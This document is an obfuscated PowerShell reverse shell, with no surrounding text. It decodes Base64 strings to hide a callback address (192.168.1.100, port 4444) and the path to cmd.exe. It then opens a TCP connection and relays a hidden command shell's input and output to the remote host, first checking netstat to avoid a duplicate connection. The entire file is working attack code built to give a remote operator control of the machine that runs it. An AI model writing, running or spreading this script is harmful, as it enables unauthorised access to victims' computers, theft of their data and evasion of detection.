﻿${17} = netstat -n
if (${17} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBQADoAUABPAFIAVAAgACAAIABFAFMAVABBAEIATABJAFMASABFAEQA')))){exit}
function cleanup {
if (${12}.Connected -eq $true) {${12}.Close()}
if (${6}.ExitCode -ne $null) {${6}.Close()}
exit}
${16} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MQA5ADIALgAxADYAOAAuADEALgAxADAAMAA=')))
${15} = 4444
${12} = New-Object system.net.sockets.tcpclient
${12}.connect(${16},${15})
${4} = ${12}.GetStream()
${9} = New-Object System.Byte[] ${12}.ReceiveBufferSize
${6} = New-Object System.Diagnostics.Process
${6}.StartInfo.FileName = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwA6AFwAXAB3AGkAbgBkAG8AdwBzAFwAXABzAHkAcwB0AGUAbQAzADIAXABcAGMAbQBkAC4AZQB4AGUA')))
${6}.StartInfo.RedirectStandardInput = 1
${6}.StartInfo.RedirectStandardOutput = 1
${6}.StartInfo.UseShellExecute = 0
${6}.Start()
${7} = ${6}.StandardInput
${5} = ${6}.StandardOutput
sleep 1
${3} = new-object System.Text.AsciiEncoding
while(${5}.Peek() -ne -1){${2} += ${3}.GetString(${5}.Read())}
${4}.Write(${3}.GetBytes(${2}),0,${2}.Length)
${2} = $null; ${13} = $false; ${14} = 0;
while (-not ${13}) {
if (${12}.Connected -ne $true) {cleanup}
${8} = 0; ${11} = 1
while ((${11} -gt 0) -and (${8} -lt ${9}.Length)) {
${10} = ${4}.Read(${9},${8},${9}.Length - ${8})
${8}+=${10}; if (${8} -and (${9}[0..$(${8}-1)] -contains 10)) {break}}
if (${8} -gt 0) {
${1} = ${3}.GetString(${9},0,${8})
${7}.write(${1})
start-sleep 1
if (${6}.ExitCode -ne $null) {cleanup}
else {
${2} = ${3}.GetString(${5}.Read())
while(${5}.Peek() -ne -1){
${2} += ${3}.GetString(${5}.Read()); if (${2} -eq ${1}) {${2} = ''}}
${4}.Write(${3}.GetBytes(${2}),0,${2}.length)
${2} = $null
${1} = $null}} else {cleanup}}
